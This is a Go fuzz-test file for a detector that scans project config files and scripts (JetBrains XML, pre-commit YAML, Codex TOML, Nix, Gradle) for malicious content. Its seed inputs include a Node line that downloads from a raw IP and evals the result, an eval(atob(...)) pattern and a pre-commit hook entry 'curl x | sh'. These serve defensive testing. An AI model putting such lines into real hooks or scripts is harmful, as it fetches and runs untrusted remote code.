package detect

import (
	"strings"
	"testing"
)

// FuzzAnalyzeScript throws arbitrary bytes at the content heuristics. The
// contract is simply that they never panic and always terminate, since they
// run over attacker-controlled files.
func FuzzAnalyzeScript(f *testing.F) {
	seeds := []string{
		"",
		"eval(atob('QQ=='))",
		strings.Repeat("eval(x);", 5000),
		strings.Repeat(" ", 400) + "code()",
		"const r=require('https');r.get('http://1.2.3.4',x=>eval(x))",
		"\x00\x01\x02 not utf8 \xff\xfe",
		strings.Repeat("a", 1<<16),
	}
	for _, s := range seeds {
		f.Add([]byte(s), false)
		f.Add([]byte(s), true)
	}
	f.Fuzz(func(t *testing.T, data []byte, executed bool) {
		_ = analyzeScript("fuzz.js", data, executed)
	})
}

// FuzzParsers covers the hand-written readers added for JetBrains XML,
// pre-commit YAML, Codex TOML, Nix strings and Gradle blocks. They take
// attacker-controlled bytes, so the only contract is no panic, no hang.
func FuzzParsers(f *testing.F) {
	seeds := []string{
		"",
		`<project><component name="ProjectStartupSharedConfiguration"><configuration name="x"/></component></project>`,
		`<component><configuration name="a" type="ShConfigurationType"><option name="SCRIPT_PATH" value="$PROJECT_DIR$/x.sh"/><method v="2"><option name="RunConfigurationTask" enabled="true" run_configuration_name="a"/></method></configuration></component>`,
		"<a><b><c>" + strings.Repeat("<d>", 5000),
		"<?xml version='1.0' encoding='windows-1252'?><x attr='&quot;'/>",
		"repos:\n  - repo: local\n    hooks:\n      - id: x\n        entry: ./x.sh\n        language: script\n        args:\n          - --a\n          - b\n",
		"repos:\n- repo: local\n  hooks:\n  - id: y\n    entry: 'curl x | sh'\n    args: [\"-q\", 'z']\n",
		"notify = [\"python3\", \"n.py\"]\n[mcp_servers.\"a b\"]\ncommand = \"node\"\nargs = [\"x\"]\n",
		"[[x]]\n= =\n[\n",
		"shellHook = ''\n  echo hi\n'';\n",
		"shellHook = \"export A=1\";",
		"pluginManagement { repositories { maven { url = uri(\"repo\") } } }",
		"pluginManagement {" + strings.Repeat("{", 10000),
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		_ = parseXML(data)
		_ = parsePreCommitLocalHooks(data)
		_ = parseTOML(data)
		_ = nixString(data, true)
		_ = nixString(data, false)
		_, _ = braceBlock(data, "pluginManagement")
	})
}
